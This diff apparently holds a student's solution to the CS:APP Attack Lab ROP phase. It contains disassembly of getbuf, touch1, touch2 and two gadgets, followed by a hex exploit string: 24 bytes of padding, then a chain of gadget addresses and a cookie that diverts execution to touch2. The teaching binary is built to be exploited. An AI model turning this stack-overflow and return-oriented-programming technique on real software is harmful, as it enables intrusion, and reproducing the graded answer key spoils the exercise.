@@ -1,0 +1,78 @@
+0000000000421d0c <getbuf>:
+  421d0c:	48 83 ec 18          	sub    $0x18,%rsp
+  421d10:	48 89 e7             	mov    %rsp,%rdi
+  421d13:	e8 52 03 00 00       	callq  42206a <Gets>
+  421d18:	b8 01 00 00 00       	mov    $0x1,%eax
+  421d1d:	48 83 c4 18          	add    $0x18,%rsp
+  421d21:	c3                   	retq   
+
+0000000000421d22 <touch1>:
+  421d22:	48 83 ec 08          	sub    $0x8,%rsp
+  421d26:	c7 05 cc 37 20 00 01 	movl   $0x1,0x2037cc(%rip)        # 6254fc <vlevel>
+  421d2d:	00 00 00 
+  421d30:	bf 1f 37 42 00       	mov    $0x42371f,%edi
+  421d35:	e8 16 ef fd ff       	callq  400c50 <puts@plt>
+  421d3a:	bf 01 00 00 00       	mov    $0x1,%edi
+  421d3f:	e8 15 05 00 00       	callq  422259 <validate>
+  421d44:	bf 00 00 00 00       	mov    $0x0,%edi
+  421d49:	e8 a2 f0 fd ff       	callq  400df0 <exit@plt>
+
+0000000000421d4e <touch2>:
+  421d4e:	48 83 ec 08          	sub    $0x8,%rsp
+  421d52:	89 fe                	mov    %edi,%esi
+  421d54:	c7 05 9e 37 20 00 02 	movl   $0x2,0x20379e(%rip)        # 6254fc <vlevel>
+  421d5b:	00 00 00 
+  421d5e:	3b 3d a0 37 20 00    	cmp    0x2037a0(%rip),%edi        # 625504 <cookie>
+  421d64:	75 1b                	jne    421d81 <touch2+0x33>
+  421d66:	bf 48 37 42 00       	mov    $0x423748,%edi
+  421d6b:	b8 00 00 00 00       	mov    $0x0,%eax
+  421d70:	e8 0b ef fd ff       	callq  400c80 <printf@plt>
+  421d75:	bf 02 00 00 00       	mov    $0x2,%edi
+  421d7a:	e8 da 04 00 00       	callq  422259 <validate>
+  421d7f:	eb 19                	jmp    421d9a <touch2+0x4c>
+  421d81:	bf 70 37 42 00       	mov    $0x423770,%edi
+  421d86:	b8 00 00 00 00       	mov    $0x0,%eax
+  421d8b:	e8 f0 ee fd ff       	callq  400c80 <printf@plt>
+  421d90:	bf 02 00 00 00       	mov    $0x2,%edi
+  421d95:	e8 71 05 00 00       	callq  42230b <fail>
+  421d9a:	bf 00 00 00 00       	mov    $0x0,%edi
+  421d9f:	e8 4c f0 fd ff       	callq  400df0 <exit@plt>
+
+0000000000421e86 <test>:
+  421e86:	48 83 ec 08          	sub    $0x8,%rsp
+  421e8a:	b8 00 00 00 00       	mov    $0x0,%eax
+  421e8f:	e8 78 fe ff ff       	callq  421d0c <getbuf>
+  421e94:	89 c6                	mov    %eax,%esi
+  421e96:	bf e8 37 42 00       	mov    $0x4237e8,%edi
+  421e9b:	b8 00 00 00 00       	mov    $0x0,%eax
+  421ea0:	e8 db ed fd ff       	callq  400c80 <printf@plt>
+  421ea5:	48 83 c4 08          	add    $0x8,%rsp
+  421ea9:	c3                   	retq
+
+
+
+
+0000000000421eb7 <addval_320>:
+  421eb7:	8d 87 48 89 c7 90    	lea    -0x6f3876b8(%rdi),%eax
+  421ebd:	c3                   	retq  
+
+b9 1e 42 00 00 00 00 00 # 421eb9: 48 89 c7 (movq $rax, $rdi)
+
+
+0000000000421eb0 <addval_447>:
+  421eb0:	8d 87 13 c8 58 90    	lea    -0x6fa737ed(%rdi),%eax
+  421eb6:	c3                   	retq   
+
+b4 1e 42 00 00 00 00 00 # 421eb4: 58 (popq $rax)
+
+9a d9 e2 68 00 00 00 00 # cookie
+4e 1d 42 00 00 00 00 00 # address <touch2> 0x421d4e
+
+61 61 61 61 61 61
+61 61 61 61 61 61
+61 61 61 61 61 61
+61 61 61 61 61 61
+b4 1e 42 00 00 00 00 00
+9a d9 e2 68 00 00 00 00
+b9 1e 42 00 00 00 00 00
+4e 1d 42 00 00 00 00 00 
